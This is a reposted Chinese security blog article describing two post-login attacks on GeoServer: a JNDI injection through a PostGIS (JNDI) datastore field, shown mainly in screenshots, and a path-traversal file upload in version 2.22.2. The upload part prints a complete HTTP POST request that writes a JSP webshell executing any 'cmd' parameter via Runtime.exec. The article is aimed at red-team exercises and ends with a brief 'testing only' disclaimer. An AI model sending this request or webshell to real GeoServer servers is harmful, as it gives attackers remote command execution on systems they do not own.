#  【转载】geoserver漏洞解析以及测试方法   
 F12sec   2024-05-25 10:49  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltD8XPW4tic7XhWH2y1kX6BrxtIs7mLr9KGqtsicVGTbEWH5ic3GY75MaN1ZLqA8sDTRsN9NwWibwmSUliaw/640?wx_fmt=png "")  
  
相信各位师傅在HVV中，都遇到过geoserver系统，但是一般都是弱口令或者信息泄露、SSRF之类的，拿shell的案例不多，下面分享下geoserver系统后台的两种打法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDicMfKmcJzYjaxQSVhek6Jmkfice4hVHZcqF6Fib0fU2tvXTzz85onPw8OvnLHDpmb2AwG6iapNMibxLDA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOUxKIDX977h2rZ4zxek8KhgGbEltlY7DGRxlEpEJHhLiaM3uX8CXbicOA/640?wx_fmt=png "")  
  
  
一、后台JNDI 注  
⼊  
  
测试版本：Version 2.13.3  
  
数据储存—》添加新的数据存储—》PostGIS (JNDI) —》jndiReferenceName *  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOJeorKPcliacSarsy4WXq14547IOH45ESkP9nibeXbe98CcibsY0M7kVDA/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOa6SibvZhPQuib4UGBVEv3LlCWH4bSOmYIDY17BUCaq95RL83DQ7QdH3A/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vO8jyLKo6U0icpp2hzrtPLMj91biaVmT6SdGR1CmWWZhc4U0js77vcjichA/640?wx_fmt=png "")  
  
  
使用CB1链，弹个计算器      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOFsDZBP25HwLkTMjIiawGxcicV6tfzJk20YiaLz2PKDOztCFVEesmFFKibg/640?wx_fmt=png "")  
  
  
            
  
二、GeoServer后台文件上传致远程代码执行漏洞  
  
测试版本：Version 2.22.2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOuKnQnia9y7edbzGSvnQechvrHRdTaf9sia1icstiaavrpzKwXfibHNouOlA/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOxhfLFXRPwGvu3ic8CsWa9AlRtc1XWEPogkSLD4ua8VdPic0y26xCse7g/640?wx_fmt=png "")  
  
  
修改相对路径为绝对路径，即可愉快的上传webshell了。      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOuU3biclygIQEfJ6hiaJ6ByWH4icvO0ZgiaJ5KgT3WE2lyxPUKQzHc3ammw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOPRFEsjH2PcMRU9agibmw67nUBxQOcCBvFFEYJPBJu5FBHNHP8CSquAg/640?wx_fmt=png "")  
  
  
我了个去，不解析jsp      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOQYtVYuqslVPAPRFpLUIrXosDVznOXAy2cUCbgckDmoLNaDxtkZ0hWw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOFIQzjNmYWbGiah7LAVDc46PjqxK6rhJynEP1RvYbARWWicb1iatdvzUbw/640?wx_fmt=png "")  
  
  
换war包用tomcat部署  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOT4nkVTiaYvU0GbK296TeUxgkeIkrOgYtzWibDDnBaozhMFo2bfx95icpw/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOBic8HWcfCMnGQwMoVlLFfmmdEibqcH0YhbPJxPA1uSTGiamPIQdqctr3Q/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOjyNJbajrjySkPenK1kKwd5NkjWutrX7XsJ1stO74o4QfLibq3fge4XQ/640?wx_fmt=png "")  
  
<table><tbody><tr><td width="414" valign="top" style="padding: 0pt 5.4pt;border-width: 1pt;border-color: windowtext;"><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">POST /geoserver/rest/workspaces/nurc/coveragestores/mosaic/file.shp?filename=../../../../shell/1.jsp HTTP/1.1</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Host: localhost:8080</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Content-Length: 370</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">sec-ch-ua: &#34;Not_A Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;120&#34;</span>        <o:page></o:page></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">sec-ch-ua-mobile: ?0</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Wicket-FocusedElementId: id39</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Content-Type: multipart/form-data; boundary-----WebKitFormBoundaryfoycybhDiQZEqxoy</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Accept: application/xml, text/xml, */*; q=0.01</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Wicket-Ajax-BaseURL: wicket/bookmarkable/org.geoserver.web.data.store.CoverageStoreEditPage?7&amp;storeName=mosaic&amp;wsName=nurc</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">X-Requested-With: XMLHttpRequest</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Wicket-Ajax: true</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">sec-ch-ua-platform: &#34;Windows&#34;</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Origin: http://localhost:8080</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Sec-Fetch-Site: same-origin</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Sec-Fetch-Mode: cors</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Sec-Fetch-Dest: empty</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Referer: http://localhost:8080/geoserver/web/wicket/bookmarkable/org.geoserver.web.data.store.CoverageStoreEditPage?7&amp;storeName=mosaic&amp;wsName=nurc</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Accept-Encoding: gzip, deflate, br</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Accept-Language: zh-CN,zh;q=0.9</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Cookie:JSESSIONID=52159346772CE228794C0E097A442D9F</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">Connection: close</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">                 <o:p> </o:p></span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">&lt;%</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">    if(request.getParameter(&#34;cmd&#34;) != null) {</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();</span>        <o:page></o:page></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">        int a = -1;</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">        byte[] b = new byte[2048];</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">        out.print(&#34;</span></p><pre>&#34;);<p><br/></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;">        while((a=in.read(b))!=-1) {</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;">            out.print(new String(b));</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;">        }</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;">        out.print(&#34;</span></p></pre>&#34;);<p><br/></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">    }</span></p><p style="line-height: 25.5px;"><span style="font-size: 12pt;line-height: 24px;font-family: &#34;Times New Roman&#34;;font-variant-numeric: normal;font-variant-east-asian: normal;font-variant-alternates: normal;font-variant-position: normal;">%&gt;</span></p></td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/mmbiz_png/wiaue9ibOltDibSceHZSNrnPVNwVp4Xo3vOptWbbRGO14CGCoDXDgzwgkicX03JMmkooXTrDubma1MBZxwT9w3rzEA/640?wx_fmt=png "")  
  
  
该漏洞虽然已公布部分 poc但仍处于 1day状态，请勿用于违法用途，仅做测试环境交流学习。由于该系统弱口令使用情况较为广泛，建议受影响的用户尽快修复漏洞。  
      
  
-=[感·谢·阅·读]=-  
  
**关于我们**  
  
  
星网实验室成立（starnetlabs）于2021年10月，是智网安云（武汉）信息技术有限公司旗下安全研究院实验室之一，其成员主要来源于国内一线安全厂商或监管执法机构，多名成员取得CISSP，CISP，PMP，CISAW，PTE等国内网络安全圈行业认证证书，该实验室研究员多次参加国内和省内网络安全攻防比赛取得佳绩。实验室主要研究方向：网络安全攻防竞赛、最前沿的攻防技术，云计算安全、物联网安全等。形成一支结构合理、创新能力强的产学研队伍。星网实验室将持续沉淀前沿安全能力，面向产业输出业蓝军网络安全对抗工具、红队攻击武器平台、蜜网平台、大数据安全管理中心等产品，并持续开放各项核心能力，推动产业安全能力建设。护航各行业数字化变革，守护大数据时代的网络安全是星网实验室的使命。  
  
**大**  
  
**佬**  
  
**，**  
  
**关**  
  
**注**  
  
**一**  
  
**下**  
  
**呗**  
  
**！**  
  
  
  
